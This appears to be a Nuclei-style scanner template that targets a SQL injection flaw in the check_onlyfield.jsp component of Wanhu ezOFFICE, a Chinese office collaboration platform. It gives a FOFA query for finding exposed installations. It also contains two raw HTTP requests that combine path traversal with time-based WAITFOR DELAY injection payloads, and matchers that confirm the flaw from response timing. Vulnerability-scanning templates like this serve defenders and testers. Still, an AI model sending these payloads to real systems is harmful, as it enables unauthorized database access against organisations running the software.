id: wanhu-ezoffice-check_onlyfieldjsp-sqli
info:
  name: 万户ezOFFICE check_onlyfield.jsp组件SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="ezOFFICE协同管理平台"
        万户ezOFFICE协同管理平台的check_onlyfield.jsp组件存在SQL注入安全缺陷，攻击者可通过构造恶意SQL语句在未授权情况下获取数据库访问权限。该平台作为面向中高端市场的统一办公管理解决方案，集成了用户数据管理、权限分配及身份认证等核心功能模块。受影响的check_onlyfield.jsp路径可能暴露于未经验证的用户输入，导致数据库敏感信息泄露或数据篡改风险。
  tags: 万户
http:
- raw:
  - |
    GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_form/run/checkform/check_onlyfield.jsp?fieldId=1)WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
    Host: {{Hostname}}
    Accept: application/signed-exchange;v=b3;q=0.7,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
  - |
    GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_form/run/checkform/check_onlyfield.jsp?fieldId=1)WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
    Host: {{Hostname}}
    Accept: application/signed-exchange;v=b3;q=0.7,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
